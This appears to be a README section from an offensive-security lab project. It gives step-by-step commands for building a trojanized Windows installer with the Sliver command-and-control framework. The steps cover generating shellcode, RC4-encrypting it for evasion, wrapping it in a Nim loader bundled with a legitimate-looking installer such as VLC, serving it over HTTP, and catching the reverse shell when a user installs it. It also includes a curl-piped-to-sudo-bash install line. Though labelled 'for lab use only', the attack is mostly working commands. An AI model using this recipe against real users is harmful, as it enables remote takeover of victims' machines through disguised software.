## Environment Setup & Configuration
### Sliver Configuration
  1. Install Sliver
    ```
      curl https://sliver.sh/install|sudo bash
    ```
  2. Start Sliver Components
    - sliver-server
    - sliver-client
  3. Create Listener in sliver-client
    ```
      http -L <IP> - l <PORT>
    ```
2. Payload Generation
   ```
     generate --http --os windows --arch amd64 --format shellcode --s /path/to/shellcode.bin
   ```
3. Payload Obfuscation
   - Compile [rc4_encrypt.c](/scripts/rc4_encrypt.c)
   ```
     gcc <FILE.C> -o <OUTPUT>
   ```
   - Encrypt Shellcode Using RC4
   ```
     ./rc4_encrypt shellcode.bin
   ```
4. Payload Delivery
  - Compile [Wrapper Nim](/src/wrapper.nim) (Compilation made on a Windows host)
  ```
    nim c -d:danger --cpu:amd64 --os:windows --ap:gui wrapper.nim
  ```
  - Make sure the following files are in the same directory:
  `shellcode.enc` `installer.exe` `wrapper.nim`

7. Host Trojanized Payload
   ```
   python3 -m http.server <PORT>
   ```
8. Simulate User Behavior
- User visits landing page
- Downloads “Original” VLC (or any other installer .exe)
- Installs the trojanized program
- Reverse shell callback is triggered

9. Listener Active
- Make sure your Sliver listener is running and waiting for a callback.

> [!NOTE]
> Tested on Windows 10 x64. For lab use only — do not deploy in real environments
